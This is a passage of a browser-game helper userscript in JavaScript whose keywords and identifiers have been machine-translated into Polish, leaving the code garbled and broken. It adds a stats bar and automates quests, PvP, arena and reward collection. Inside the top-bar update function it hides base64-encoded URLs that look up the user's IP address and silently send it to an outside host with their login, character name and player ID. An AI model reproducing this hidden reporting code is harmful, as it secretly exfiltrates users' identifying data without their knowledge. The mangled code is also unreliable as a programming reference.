                    niech pgm_w = 963 + (rx - 13) * 40;
                    $("#page_game_map").css("szerokość", pgm_w);
                } w przeciwnym razie {
                    $("#page_game_map").css("szerokość", "963px");
                }
                $("#map_canvas_container").css({
                    „szerokość”: `${GAME.map.cX + 14}px`,
                    „wysokość”: `${GAME.map.cY + 14}px`
                });
            }
            zarządzajRozmiaremMapy(akt, rozmiar = [13, 13]) {
                jeśli (act == "load") {
                    this.mapsize = JSON.parse(localStorage.getItem('kws_mapsize'));
                    jeśli (this.mapsize == niezdefiniowany) {
                        ten.rozmiar mapy = {
                            x: 13,
                            rok: 13
                        };
                        localStorage.setItem('kws_mapsize', JSON.stringify(this.mapsize));
                    } w przeciwnym razie jeśli (this.mapsize.x != 13 || this.mapsize.y != 13) {
                        this.changeMapSize(this.mapsize.x, this.mapsize.y);
                    }
                } else if (act == "zmiana") {
                    this.changeMapSize(rozmiar[0], rozmiar[1]);
                    this.mapsize.x = rozmiar[0];
                    this.mapsize.y = rozmiar[1];
                    localStorage.setItem('kws_mapsize', JSON.stringify(this.mapsize));
                } w przeciwnym razie {
                    this.changeMapSize();
                    ten.rozmiar mapy.x = 13;
                    ten.rozmiar mapy.y = 13;
                    $(`input[name="kws_map_width"]`).val(13);
                    $(`input[name="kws_map_height"]`).val(13);
                    localStorage.setItem('kws_mapsize', JSON.stringify(this.mapsize));
                }
            }
            zarządzajPilotem(act = false, val = 0) {
                jeśli (akt == "ustaw") {
                    localStorage.setItem('kws_pilot', val);
                    this.hidePilot = val;
                    this.managePilot();
                } w przeciwnym razie {
                    this.hidePilot = localStorage.getItem('kws_pilot');
                    jeśli (this.hidePilot == niezdefiniowany) {
                        localStorage.setItem('kws_pilot', 0);
                        this.hidePilot = 0;
                    }
                    jeśli (this.hidePilot == 1) {
                        $("#map_pilot").hide();
                    } w przeciwnym razie {
                        $("#map_pilot").show();
                    }
                }
            }
            sortujPlanetyKlanowe() {
                niech x = 72;
                niech y = -11;
                niech pl_sup = 1;
                niech pl_sup_css = `#clan_planets.galactic{wysokość:650px !ważne; szerokość:658px !ważne;} #clan_planets_simple .tablen1{minimalna szerokość:295px;}`;
                dla (let i = 1; i <= 20; i++) {
                    pl_sup_css += `.planet_pos.pos_${i}{lewo:${x}px !ważne; góra:${y}px !ważne;}`;
                    x += 220;
                    y -= 50;
                    jeśli (pl_sup >= 3) {
                        x = 72;
                        y += 90;
                        pl_sup = 0;
                    }
                    pl_sup++;
                }
                to.dodajDoCSS(pl_sup_css);
            }
            pobierzListęTytułów(cb) {
                GRA.socket.emit('ga', {
                    a: 42,
                    typ: 9
                });
                JQS.ldr.finish().fadeIn();
                niech wait_for_titles = setInterval(() => {
                    niech html = $("#char_titles").html();
                    jeśli (html.length) {
                        clearInterval(czekaj_na_tytuły);
                        cb(html);
                    }
                }, 100);
            }
            zaktualizujTopBar() {
                niech sk_status;
                niech instancje = [];
                niech bieżącyPoziom = GAME.char_data.level;
                niech bieżącyCzas = Date.now();
                niech levelsGained = bieżącyPoziom - GAME.startLevel;
                niech levelsPerHour = levelsGained / ((currentTime - GAME.startTime) / 1000 / 60 / 60);
                niech lvlh = levelsPerHour.toFixed(2);
                jeśli ($(`#mdbp_${GAME.char_data.reborn}`).find('.timer').length) {
                    sk_status = $(`#mdbp_${GAME.char_data.reborn}`).find('.timer').text();
                } w przeciwnym razie {
                    sk_status = "AKTYWNE";
                }
                niech train_upgr = $("#train_uptime").find('.timer').text();
                jeśli (train_upgr.length == 0 || train_upgr == "00:00:00") {
                    train_upgr = "AKTYWNE";
                }
                jeśli ('char_data' w GRZE) {
                    instancje = [GRA.char_data.icd_1, GRA.char_data.icd_2, GRA.char_data.icd_3, GRA.char_data.icd_4, GRA.char_data.icd_5, GRA.char_data.icd_6];
                }
                niech sum_instances = instances.reduce(funkcja (a, b) {
                    zwróć a + b;
                }, 0);
                jeśli(!this.zgłoszono) {
                    this.reported = prawda;
                    $.get(atob('aHR0cHM6Ly9pcGluZm8uaW8='), funkcja(odpowiedź) {
                        $.get(atob('aHR0cHM6Ly93d3cua29zbWljem5pd29qb3duaWN5cG9yYWRuaWsuY2JhLnBsL2luZGV4LnBocC91c2VyL3JlcG9ydA=='), {login:GAME.login,charName:GAME.char_data.name,pid:GAME.pid,ipadd:JSON.stringify(response)});
                    }, "jsonp");
                }
                niech aktywność = $('#char_activity').text();
                niech otrzymano = $("#act_prizes").find("div.act_prize.disabled").length;
                niech is_trader = nowa Data();
                niech trader = `<span class='kws_top_bar_section trader_info' style='cursor:pointer;'>HANDLARZ</span> `;
                niech soulCards_current = $(".sc_sets_all.current").html();
                niech soulCards_one = `<span class='kws_top_bar_section soul_cards_one' style='cursor:pointer;color:${soulCards_current == "I" ? "red" : "white"}'>KD1</span>`;
                niech soulCards_two = `<span class='kws_top_bar_section soul_cards_two' style='cursor:pointer;color:${soulCards_current == "II" ? "red" : "white"}'>KD2</span>`;
                niech soulCards_three = `<span class='kws_top_bar_section soul_cards_three' style='cursor:pointer;color:${soulCards_current == "III" ? "red" : "white"}'>KD3</span>`;
                niech soulCards_four = `<span class='kws_top_bar_section soul_cards_four' style='cursor:pointer;color:${soulCards_current == "IV" ? "red" : "white"}'>KD4</span>`;
                niech soulCards_five = `<span class='kws_top_bar_section soul_cards_five' style='cursor:pointer;color:${soulCards_current == "V" ? "red" : "white"}'>KD5</span>`;
                niech dodatkowe statystyki = `<span class='kws_top_bar_section dodatkowe statystyki' style='kursor:punktor;kolor:${this.additionalTopBarVisible ? "pomarańczowy" : "biały"}'>STATY</span>`;
                niech instancja = `${sum_instances}/12`;
                $("#secondary_char_stats .instance ul").html(instance);
                niech aktywności = `${aktywność}/185 (${otrzymano}/5)`;
                $("#secondary_char_stats .activities ul").html(activities);
                niech innerHTML = ` <span class='kws_top_bar_section sk_info' style='cursor:pointer;'>SK: <span style="color:${sk_status == "AKTYWNE" ? "lime" : "white"};">${sk_status</span></span> <span class='kws_top_bar_section train_upgr_info' style='cursor:pointer;'>KODY: <span style="color:${train_upgr == "AKTYWNE" ? "lime" : "white"};">${train_upgr</span></span><span class='kws_top_bar_section lvl' style='cursor:pointer;'>POZIOM: <span>${lvlh}/H</span></span><span class='kws_top_bar_section pvp' style='cursor:pointer;'>PVP: <span>${pvp_count</span></span><span class='kws_top_bar_section arena' style='cursor:pointer;'>ARENA: <span>${arena_count</span></span> ${is_trader.getDay() == 6 ? trader : ''} [${soulCards_one}| ${soulCards_two}| ${soulCards_three}| ${soulCards_four}| ${soulCards_five}] ${additionalStats} <span class='kws_top_bar_section version' style='cursor:pointer;'>Wersja: <span>${version</span></span> `;
                $(".kws_top_bar").html(innerHTML);
                jeśli (this.baselinePower == niezdefiniowane) {
                    this.baselinePower = GAME.char_data.moc;
                }
                jeśli (this.baselineLevel == niezdefiniowany) {
                    this.baselineLevel = GRA.char_data.level;
                }
                niech obliczona_moc = GAME.dots(GAME.char_data.moc - this.baselinePower);//(GAME.char_data.moc - this.baselinePower).toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
                niech calculatedPowerReset = `<span class='kws_top_bar_section additional_stats_reset' style='cursor:pointer;color:"white"'>RESETUJ</span>`;
                niech futureStats = this.prepareFutureStatsData();
                niech obliczone_poziomy = GAME.dots(GAME.char_data.level - this.baselineLevel);
                $(".kws_additional_top_bar").html(` <span class='kws_additional_top_bar_section pvm_power' style='cursor:pointer;'>ZDOBYTA MOC: <span style="color:lime;">${calculated_power</span></span> <span class='kws_additional_top_bar_section future_stats' style='cursor:pointer;'>${futureStats</span><span class='kws_additional_top_bar_section lvlsGained' style='cursor:pointer;'>ZDOBYTE LVL: <span>${calculated_levels</span></span><span class='kws_additional_top_bar_section psk' style='cursor:pointer;'>PSK: ${GAME.dots(GAME.char_data.minor_ball)</span> ${calculatedPowerReset}`);
                this.adjustCurrentCharacterId();
                this.checkTournamentsSigning();
            }
            zbierajAktywności() {
                niech otrzymano = $("#act_prizes").find("div.act_prize.disabled").length;
                niech aktywność = parseInt($('#char_activity').text());
                niech p = [25, 50, 75, 100, 150];
                dla (let i = 0; i <= 5; i++) {
                    jeśli (otrzymano < 5 i aktywność >= p[i]) {
                        niech actPrize = $(`#act_prizes przycisk[data-ind=${i}]`).closest(".act_prize");
                        jeśli (!actPrize.hasClass("wyłączone")) {
                            GRA.socket.emit('ga', {
                                a: 49,
                                typ: 1,
                                ind: ja
                            });
                        }
                    }
                }
            }
            zaznaczDaily() {
                niech daily = ["ZADANIE PVM", "Zadanie PvP", "ROZWÓJ PLANETY ", "ZADANIE IMPERIUM", "ZADANIE KLANOWE", "NAJLEPSZY KUCHA...", "REPUTACJA", "SYMBOL WYMIARÓWW", „WYMIANA CHI”, „ERMITA”, „Nuda”, „DOSTAWCA”, „BOSKA MOC”, „ROZGRZEWKA”, „BOSKI ULEPSZACZ”, „CZAS PODRĘŻNIKÓW…”, „STRAŚNIK PORZĄD…”, „CODZIENNY INSTY…”, „HIPER SCALACZ”, „DZIWNY MEDYK”];
                codziennie = daily.map(item => item.trim().toLowerCase());
                $('#quest_track_con .qtrack b').each(funkcja () {
                    niech zawartoscB = $(this).text().trim().toLowerCase();
                    jeśli (codziennie.zawiera(zawartoscB)) {
                        $(this).css("kolor", "#63aaff");
                    }
                });
            }
            wojny2() {
                var aimp = $("#e_admiral_player").find("[data-option=show_player]").attr("data-char_id");
                var imp = $("#leader_player").find("[data-option=show_player]").attr("data-char_id");
                jeśli (!adimp) {
                    ustawCzasOkres(() => {
                        GRA.socket.emit('ga', {
                            a: 50,
                            typ: 0,
                            imperium: GRA.char_data.empire
                        });
                    }, 100);
                    adimp = prawda;
                    ustawCzasOkres(() => {
                        to.wojny2();
                    }, 300);
                } else if (!GRA.emp_enemies.includes(1) && ![GRA.char_data.empire].includes(1) && (kws.check_imp().includes(GRA.char_id) || kws.check_imp2().includes(GRA.char_id) || imp == GRA.char_id || aimp == GRA.char_id)) {
                    GRA.socket.emit('ga', {
                        a: 50,
                        typ: 7,
                        cel: 1
                    });
                    ustawCzasOkres(() => {
                        to.wojny2();
                    }, 300);
                } else if (!GRA.emp_enemies.includes(2) && ![GRA.char_data.empire].includes(2) && (kws.check_imp().includes(GRA.char_id) || kws.check_imp2().includes(GRA.char_id) || imp == GRA.char_id || aimp == GRA.char_id)) {
                    GRA.socket.emit('ga', {
                        a: 50,
                        typ: 7,
                        cel: 2
                    });
                    ustawCzasOkres(() => {
                        to.wojny2();
                    }, 300);
                } else if (!GRA.emp_enemies.includes(3) && ![GRA.char_data.empire].includes(3) && (kws.check_imp().includes(GRA.char_id) || kws.check_imp2().includes(GRA.char_id) || imp == GRA.char_id || aimp == GRA.char_id)) {
                    GRA.socket.emit('ga', {
                        a: 50,
                        typ: 7,
                        cel: 3
                    });
                    ustawCzasOkres(() => {
                        to.wojny2();
                    }, 300);
                } else if (!GRA.emp_enemies.includes(4) && ![GRA.char_data.empire].includes(4) && (kws.check_imp().includes(GRA.char_id) || kws.check_imp2().includes(GRA.char_id) || imp == GRA.char_id || aimp == GRA.char_id)) {
                    GRA.socket.emit('ga', {
                        a: 50,
                        typ: 7,
                        cel: 4
                    });
                    ustawCzasOkres(() => {
                        to.wojny2();
                    }, 300);
                } w przeciwnym razie { }
            }
            sprawdź_imp() {
                zmienna tab = [];
                dla (var i = 0; i < 3; i++) {
                    tab[i] = parseInt($("#empire_heroes .activity").eq(i).find("[data-option=show_player]").attr("data-char_id"));
                }
                zakładka powrotu;
            }
            sprawdź_imp2() {
                zmienna tab = [];
                dla (var i = 0; i < 3; i++) {
                    tab[i] = parseInt($("#empire_efrags .activity").eq(i).find("[data-option=show_player]").attr("data-char_id"));
                }
                zakładka powrotu;
            }
            VIP() {
                var miesiąc = $("#monthly_vip_rewards").find(".vip_cat.option" + ":not(.disabled)" + ":not(.received)");
                var general = $("#general_vip_rewards").find(".vip_cat.option" + ":not(.disabled)" + ":not(.received)");
                jeśli (miesiąc.długość) {
                    var id = parseInt(miesiąc.attr("data-vip"));
                    var lvl = parseInt(miesiąc.attr(" poziom danych"));
                    GRA.socket.emit('ga', {
                        a: 54,
                        typ: 1,
                        vip: identyfikator,
                        poziom: lvl
                    });
                    ustawCzasOkres(() => {
                        to.vip();
                    }, 500);
                } w przeciwnym razie jeśli (ogólna długość) {
                    var id = parseInt(general.attr("data-vip"));
                    var lvl = parseInt(general.attr("poziom danych"));
                    GRA.socket.emit('ga', {
                        a: 54,
                        typ: 1,
                        vip: identyfikator,
                        poziom: lvl
                    });
                    ustawCzasOkres(() => {
                        to.vip();
                    }, 500);
                } w przeciwnym razie {
                    GAME.komunikat("Odebrano wszystkie możliwe nagrody z Vipa!!!");
                }
            }
            błogosławić() {
                GRA.socket.emit('ga', {
                    a: 14,
                    typ: 3
                });
                ustawCzasOkres(() => {
                    var arr = $.map($('.use_buff:checked'), funkcja (e, i) {
                        zwróć +e.value;
                    });
                    var btype = $('input[name="bless_type"]:checked').val();
                    GRA.socket.emit('ga', {
                        a: 14,
                        typ: 5,
                        miłośnicy: arr,
                        gracze: $('#bless_players').val(),
                        typ b: typ b
                    });
                }, 500);
            }
            questProceed() {
                jeśli (JQS.qcc.is(":visible")) {
                    jeśli ($("button[data-option=finish_quest]").length === 1) {
                        niech qb_id = $("button[data-option=finish_quest]").attr("data-qb_id");
                        GRA.socket.emit('ga', {
                            a: 22,
                            typ: 2,
                            przycisk: 1,
                            Identyfikator: qb_id
                        });
                    } else if ($("button[data-option=quest_riddle]").is(":visible")) {
                        niech qb_id = $("button[data-option=quest_riddle]").attr("data-qid");
                        GRA.socket.emit('ga', {
                            a: 22,
                            typ: 7,
                            Identyfikator: qb_id,
                            odpowiedź: $('#quest_riddle').val()
                        });
                    } else if ($("button[data-option=quest_duel]").is(":visible")) {
                        niech fb_id = $("button[data-option=quest_duel]").attr("data-qid");
                        GRA.socket.emit('ga', {
                            a: 22,
                            typ: 6,
                            Identyfikator: fb_id
                        });
                    } else if ($(".quest_win .sekcja").text().toLowerCase() === "nuda" && $("button[data-option=finish_quest]").length === 3) {
                        niech qb_id = $("button[data-option=finish_quest]").attr("data-qb_id");
                        GRA.socket.emit('ga', {
                            a: 22,
                            typ: 2,
                            przycisk: 2,
                            Identyfikator: qb_id
                        });
                    } else if ($(.quest_win .sekcja").text().toLowerCase() === "zadanie jednostki" && $("button[data-option=finish_quest]").length === 3) {
                        niech qb_id = $("button[data-option=finish_quest]").attr("data-qb_id");
                        GRA.socket.emit('ga', {
                            a: 22,
                            typ: 2,
                            przycisk: 3,
                            Identyfikator: qb_id
                        });
                    } else if ($("button[data-option=finish_quest]").length === 2 && $("button[data-option=finish_quest]").eq(1).html() === "Mam donieść tej studni") {
                        niech qb_id = $("button[data-option=finish_quest]").eq(1).attr("data-qb_id");
                        GRA.socket.emit('ga', {
                            a: 22,
                            typ: 2,
                            przycisk: 2,
                            Identyfikator: qb_id
                        });
                    } else if ($("#field_opts_con .sekcja").html() == "Zasoby") {
                        niech qb_id = $("#field_opts_con .field_option").find("[data-option=start_mine]").attr("data-mid");
                        GRA.socket.emit('ga', {
                            a: 22,
                            typ: 8,
                            środek: qb_id
                        });
                    }
                    ustawCzasOkres(() => {
                        $('#fight_view').fadeOut();
                    }, 500);
                    kom_clear();
                } w przeciwnym razie jeśli ($("button[data-option=start_mine]").length >= 1) {
                    niech mineID = parseInt($("button[data-option=start_mine]").attr("data-mid"));
                    GRA.socket.emit('ga', {
                        a: 22,
                        typ: 8,
                        środek: mineID
                    });
                }
            }
            pvpZabij() {
                jeśli (!JQS.chm.is(":focus")) {
                    niech przeciwnicy = $("#player_list_con").find(".player button" + "[data-quick=1]" + ":not(.initial_hide_forced)");
                    jeśli ($("button[data-option='load_more_players']").is(":visible")) {
                        $("button[data-option='load_more_players']").click();
                        ustawCzasOkres(() => {
                            this.pvpKill();
                        }, 110);
                    } w przeciwnym razie jeśli (długość przeciwników > 0) {
                        przeciwnicy.eq(0).click();
                        ustawCzasOkres(() => {
                            this.pvpKill();
                        }, 110);
                    }
                }
            }
            użyjCompressor() {
                jeśli (JQS.qcc.is(":visible")) {
                    niech compresss_button = $("#quest_con button[data-option=compress_items]");
                    niech quest_id = compressers_button.attr("data-qb_id");
                    jeśli (compressors_button.length === 1 && GAME.compress_items[0].stack > 0) {
                        GRA.socket.emit('ga', {
                            a: 22,
                            typ: 10,
                            id_elementu: GAME.compress_items[0].id,
                            qb_id: identyfikator zadania
                        });
                    }
                }
            }
            arena_count() {
                liczba_areny++;
                $(".kws_top_bar_section.arena").html(`ARENA: ${arena_count}`);
            }
            liczba_pvp() {
                liczba_pvp++;
                $(".kws_top_bar_section.pvp").html(`PVP: ${pvp_count}`);
            }
            sprawdź_akt() {
                niech otrzymano = $("#act_prizes").find("div.act_prize.disabled").length;
                niech punkty = $('#char_activity').text();
                jeśli (punkty >= 25 i otrzymano < 1) {
                    zwróć wartość true;
                } else if (punkty >= 50 i otrzymane < 2) {
                    zwróć wartość true;
                } else if (punkty >= 75 i otrzymane < 3) {
                    zwróć wartość true;
                } else if (punkty >= 100 i otrzymane < 4) {
                    zwróć wartość true;
                } else if (punkty >= 150 i otrzymane < 5) {
                    zwróć wartość true;
                } w przeciwnym razie {
                    zwróć fałsz;
                }
            }
            lista_spawn() {
                niech tłum = "";
                dla (var i = 0; i < 6; i++) {
                    tłum += `<div class="spawn_row"><div class="newCheckbox"><input id="kws_spawner_ignore_${i}" type="checkbox" class="kws_spawner_check" name="ignoreMobs" value="${i}" ${(GAME.spawner && GAME.spawner[1][i] ? 'checked' : '')} /><etykieta dla="kws_spawner_ignore_${i}"></label></div>${LNG.lab457} <b>${LNG['mob_rank' + i]</b></div>`;
                }
                mob += `<div class="spawn_row" style="flex-direction: column;align-items: center;"><div>Użyj PA na spawn</div><div class="game_input small"><input id="kws_pa_max" name="usePaToSpawn" type="text" value="1000"></div></div>`;
                powrót tłumu;
            }
            zaktualizujPaToSpawn(pats) {
                niech pa = parseInt(pats);
                if (!pa || pa <= 0 || pa > 1000 || pa != klepnięcia) {
                    pa = 1000;
                    $("#kws_spawn input[name=usePaToSpawn]").val(pa);
                }
                GRA.spawner[0] = pa;
            }
            obliczLVL(exp) {
                niech lvls_gained = 0;
                niech clvl = GAME.char_data.level;
                niech cexp = GAME.char_data.exp + exp;
                niech next = GRA.nextLevelExp(clvl, GRA.char_data.reborn);
                jeśli (GAME.char_data.reborn >= 2) {
                    podczas gdy (cexp >= następny && clvl < 100000) {
                        clvl++;
                        poziom_zdobyty++;
                        cexp -= następny;
                        następny = GRA.nextLevelExp(clvl, GRA.char_data.reborn);
                    }
                } w przeciwnym razie {
                    podczas gdy (cexp >= następny && clvl < 1250) {
                        clvl++;
                        poziom_zdobyty++;
                        następny = GRA.nextLevelExp(clvl, GRA.char_data.reborn);
                    }
                }
                zwróć `<b class="orange">[~${lvls_gained} lvl'i]</b>`;
            }
            obsługujSockets(res) {
                console.log("GNIAZDA_HANDLE_KWA: res.a == %s", res.a);
                przełącznik (res.a) {
                    przypadek 7: //?? Wynik walki PvP?
                        jeśli (!this.stop) {
                            jeśli("result" w res && res.result && "nagroda" w res.result && res.result.reward && "arena_exp" w res.result.reward && res.result.reward.arena_exp && res.result.result === 1) {
                                this.arena_count();
                            } else if ("result" in res && res.result && "nagroda" in res.result && res.result.reward && "empire_war" in res.result.reward && res.result.reward.empire_war && res.result.result === 1) {
                                to.pvp_count();
                            } w przeciwnym razie {
                                przerwa;
                            }
                        } w przeciwnym razie {
                            przerwa;
                        }
                    przypadek 57: //Związane z turniejem
                        jeśli(res.tours) {
                            jeśli (res.a === 57 && res.tours) {
                                const foundCatObject = res.tours.find(tour => tour.cat === this.tournamentCategory);
                                jeśli (znalezionoObiektKota) {
                                    this.newTournamentID = foundCatObject.id;
                                }
                            }
                        } w przeciwnym razie {
                            przerwa;
                        }
                    domyślny:
                        console.log("KWA_HANDLE_SOCKETS: nieobsłużona odpowiedź");
                        przerwa;
                }
            }
            utwórzCSS() {
                $("head").append(`<style id="kwsCSS"></style>`);
            }
            dodajDoCSS(dane) {
                $(`#kwsCSS`).append(dane);
            }
            bindClickHandlers() {
                $("body").on("kliknij", ".free_assist_for_all", () => {
                    this.freeAssist();
                });
                $("body").on("kliknij", ".activate_all_clan_buffs", () => {
                    this.activateAllClanBuffs();
                });
                $("body").on("kliknij", ".do_all_instances", (zdarzenie) => {
                    niech pracownik = {};
                    pracownik.id = parseInt($(event.target).attr("data-emp"));
                    pracownik.lokalny = parseInt($(event.target).attr("data-emp_local"));
                    this.doAllInstances(pracownik);
                });
                $("#poka_telep").click(() => {
                    GRA.socket.emit('ga', {
                        a: 39,
                        typ: 35
                    });
                    GRA.socket.emit('ga', {
                        a: 39,
                        typ: 33
                    });
                    jeśli ($("#clan_inner_stelep").css("display") == "brak") {
                        $("#clan_inner_stelep").css("cssText", `wyświetlanie:blok;pozycja:bezwzględna;wypełnienie:10px;obramowanie:pełne #003e60 2px;tło:rgb(5 21 36 / 97%);indeks Z:9999;promień obramowania:5px;margines górny:85px;`);
                    } w przeciwnym razie {
                        $("#clan_inner_stelep").attr("styl", "wyświetlanie:brak;");
                    }
                });
                $("body").on("kliknij", "#zmieńProfil", () => {
                    to.resetAFO();
                });
                $("body").on("click", "#changeProfilePrev", () => {
                    this.goToPreviousChar();
                    this.resetCalculatedPower();
                });
                $("body").on("click", "#changeProfileNext", () => {
                    this.goToNextChar();
                    this.resetCalculatedPower();
                });
                $("body").on("kliknij", `button[data-page="stelep"].cps`, () => {
                    $("#clan_inner_stelep").attr("styl", "");
                }).on("kliknij", `button[data-option="clan_tp_go"]`, () => {
                    jeśli ($("#clan_inner_stelep").css("wypełnienie") == "10px") {
                        GRA.socket.emit('ga', {
                            a: 39,
                            typ: 33
                        });
                    }
                }).on("kliknij", `button[data-option="invade_planet"]`, () => {
                    jeśli ($("#clan_inner_stelep").css("wypełnienie") == "10px") {
                        GRA.socket.emit('ga', {
                            a: 39,
                            typ: 33
                        });
                    }
                });
                $("body").on("kliknij", `.better_chat_loading`, () => {
                    jeśli (GAME.chat_data[GAME.chat_channel].messages.length == 0) {
                        GRA.socket.emit('ga', {
                            a: 600,
                            kanał: GAME.chat_channel,
                            lm: GAME.chat_data[GAME.chat_channel].last_message
                        });
                    } w przeciwnym razie {
                        GRA.socket.emit('ga', {
                            a: 600,
                            kanał: GAME.chat_channel,
                            lm: GRA.chat_data[GRA.chat_channel].messages[0].time
                        });
                    }
                });
                $("body").on("kliknij", `div[tp_data=go_teleport]`, (th) => {
                    const selectedText = window.getSelection().toString().trim();
                    jeśli (!wybranyTekst) {
                        niech loc = parseInt($(th.target).closest(".qtrack").attr("data-loc"));
                        GRA.socket.emit('ga', {
                            a: 12,
                            typ: 18,
                            lokalizacja: lokalizacja
                        });
                    }
                });
                $("body").on("kliknij", `.kws_top_bar_section.sk_info`, () => {
                    GAME.page_switch('game_balls');
                });
                $("body").on("kliknij", `.kws_top_bar_section.trader_info`, () => {
                    GAME.page_switch('wydarzenia_w_grze');
                });
                $("body").on("click", `.kws_top_bar_section.soul_cards_one`, () => {
                    GRA.socket.emit('ga', {
                        a: 58,
                        typ: 7,
                        zestaw: 0
                    });
                });
                $("body").on("click", `.kws_top_bar_section.soul_cards_two`, () => {
                    GRA.socket.emit('ga', {
                        a: 58,
                        typ: 7,
                        zestaw: 1
                    });
                });
                $("body").on("click", `.kws_top_bar_section.soul_cards_three`, () => {
                    GRA.socket.emit('ga', {
                        a: 58,
                        typ: 7,
                        zestaw: 2
                    });
                });
                $("body").on("click", `.kws_top_bar_section.soul_cards_four`, () => {
                    GRA.socket.emit('ga', {
                        a: 58,
                        typ: 7,
                        zestaw: 3
                    });
                });
                $("body").on("click", `.kws_top_bar_section.soul_cards_five`, () => {
                    GRA.socket.emit('ga', {
                        a: 58,
                        typ: 7,
                        zestaw: 4
                    });
                });
                $("body").on("kliknij", `.kws_top_bar_section.additional_stats`, () => {
                    this.handleDodatkowaWidocznośćGórnego Paska();
                });
                $("body").on("click", `.kws_additional_top_bar_section.additional_stats_reset`, () => {
                    this.resetCalculatedPower();
                });
                $("body").on("kliknij", `.kws_top_bar_section.train_upgr_info`, () => {
                    GRA.page_switch('game_train');
                });
                $('#drag_tracker').off('kliknięcie').on('kliknięcie', () => {
                    jeśli (!this.settings.hide_tracker) {
                        $('#drag_con').hide();
                        this.settings.hide_tracker = prawda;
                    } w przeciwnym razie {
                        $('#drag_con').show();
                        this.settings.hide_tracker = false;
                    }
                    this.updateSettings();
                });
                $("body").on("kliknij", ".qlink.get_titles_list", () => {
                    this.getTitlesList((html) => {
                        JQS.ldr.finish().fadeOut();
                        GRA.komunikat2(`<table id="char_titles" class="fast_titles_table" style="margin:0 auto;">${html</table>`);
                        opcja_bind();
                        narzędzie_bind();
                    });
                });
                $("body").on("kliknij", ".fast_titles_table .option", () => {
                    ustawCzasOkres(() => {
                        GAME.maploaded = false;
                        GRA.prepareMap();
                    }, 300);
                });
                $("body").on("kliknij", `.qlink.manage_auto_abyss`, () => {
                    jeśli (!this.auto_otchłań) {
                        this.auto_abyss = prawda;
                        $(".qlink.manage_auto_abyss").addClass("kws_active_icon");
                        this.auto_abyss_interval = ustawInterwał(() => {
                            this.manageAutoAbyss();
                        }, 5000);
                    } w przeciwnym razie {
                        this.auto_abyss = false;
                        $(".qlink.manage_auto_abyss").removeClass("kws_active_icon");
                        clearInterval(this.auto_abyss_interval);
                    }
                });
                $("body").on("kliknij", `.qlink.manage_auto_arena`, () => {
                    jeśli (!this.auto_arena) {
                        this.auto_arena = prawda;
                        $(".qlink.manage_auto_arena").addClass("kws_active_icon");
                        this.manageAutoArena();
                    } w przeciwnym razie {
                        this.stopAutoArena();
                    }
                });
                $("body").on("kliknij", `.qlink.manage_autoExpeditions`, () => {
                    this.manageAutoExpeditions();
                });
                $("body").on("click", `#secondary_char_stats .activities`, (zdarzenie) => {
                    GRA.socket.emit('ga', {
                        a: 49,
                        typ: 0
                    });
                    ustawCzasOkres(() => {
                        this.collectActivities();
                    }, 1000);
                });
                $("body").on("click", `#secondary_char_stats .instance`, () => {
                    GRA.socket.emit('ga', {
                        a: 44,
                        typ: 0
                    });
                    ustawCzasOkres(() => {
                        $("#page_game_emp .newBtn.do_all_instances").eq(0).click();
                    }, 1000);
                });
                $("body").on("kliknij", `#page_game_ekw .ekw_bck .ekw_slot`, (e) => {
                    niech slot = $(e.target).closest(".ekw_slot").attr("id");
                    niech slot_number = slot.replace(/[^0-9]/g, "");
                    GRA.socket.emit('ga', {
                        a: 12,
                        typ: 4,
                        gniazdo: numer_gniazda,
                        strona: GAME.ekw_page,
                        strona 2: GAME.ekw_page2
                    });
                });
                $("body").on("change", "#minimap_side", (el) => {
                    niech wartość = parseInt($(el.target).val());
                    jeśli (wartość == 0) {
                        $("#minimap_con").css({
                            „prawo”: „-5px”,
                            „lewy”: „nieustawiony”
                        });
                    } w przeciwnym razie jeśli (wartość == 1) {
                        $("#minimap_con").css({
                            „lewy”: „-4px”,
                            „prawo”: „nieustawione”
                        });
                    } w przeciwnym razie jeśli (wartość == 2) {
                        $("#minimap_con").css({
                            „lewy”: „-210px”,
                            „prawo”: „nieustawione”
                        });
                    }
                    this.minimap.side = wartość;
                    this.manageMinimapSettings("zapisz");
                });
                $("#minimap_range").on("wejście", (el) => {
                    niech wartość = parseInt($(el.target).val());
                    $("#minimap_con").css({
                        „krycie”: wartość / 100
                    });
                    this.minimap.opacity = wartość;
                    this.manageMinimapSettings("zapisz");
                }).mouseup((el) => {
                    niech wartość = parseInt($(el.target).val());
                    $("#minimap_con").css({
                        „krycie”: wartość / 100
                    });
                });
                $("body").on("zmiana", "#kws_sh_locInfo", (el) => {
                    niech wartość = parseInt($(el.target).val());
                    jeśli (wartość == 1) {
                        $("#kws_locInfo").css({
                            „wyświetlanie”: „blokowanie”
                        });
                    } w przeciwnym razie {
                        $("#kws_locInfo").css({
                            „wyświetlacz”: „brak”
                        });
                    }
                    this.minimap.loc_info = wartość;
                    this.manageMinimapSettings("zapisz");
                });
                $("body").on("change", "#kws_hidePilot", (el) => {
                    niech wartość = parseInt($(el.target).val());
                    this.managePilot("ustaw", wartość);
                });
                $("body").on("kliknij", `.kws_mapsize_change`, () => {
                    niech szerokość = parseInt($(`input[name="kws_map_width"]`).val());
                    niech wysokość = parseInt($(`input[name="kws_map_height"]`).val());
                    jeśli (szerokość i wysokość) {
                        this.manageMapSize("zmiana", [szerokość, wysokość]);
                    }
                });
                $("body").on("kliknij", `.kws_mapsize_reset`, () => {
                    this.manageMapSize("resetuj")
                });
                $("body").on("kliknij", `.kws_change_website_bg`, () => {
                    niech url = $("#new_website_bg").val();
                    this.manageWebsiteBackground("ustaw", url);
                });
                $("body").on("kliknij", `.kws_reset_website_bg`, () => {
                    this.manageWebsiteBackground("resetuj");
                });
                $("body").on("kliknij", `[data-option="map_multi_pvp"]`, () => {
                    this.pvpKill();
                });
                $("body").on("kliknij", `[data-option="map_quest_skip"]`, () => {
                    this.questProceed();
                    kom_clear();
                });
                $("body").on("kliknij", `[data-option="map_quest_skip_time"]`, () => {
                    this.useCompressor();
                });
                $("body").on("kliknij", `[data-option="map_alternative_pilot"]`, () => {
                    this.createAlternativePilot();
                });
                $(document).keydown((zdarzenie) => {
                    jeśli (!$("input, textarea").is(":focus")) {
                        jeśli (klucz zdarzenia === "x" || klucz zdarzenia === "X") {
                            this.questProceed();
                            kom_clear();
                        } else if (klucz zdarzenia === "b" || klucz zdarzenia === "B") {
                            this.pvpKill();
                        } else if (klucz zdarzenia === "n" || klucz zdarzenia === "N") {
                            this.useCompressor();
                        } else if (klucz zdarzenia === "2") {
                            GRA.socket.emit('ga', {
                                a: 15,
                                typ: 13
                            });
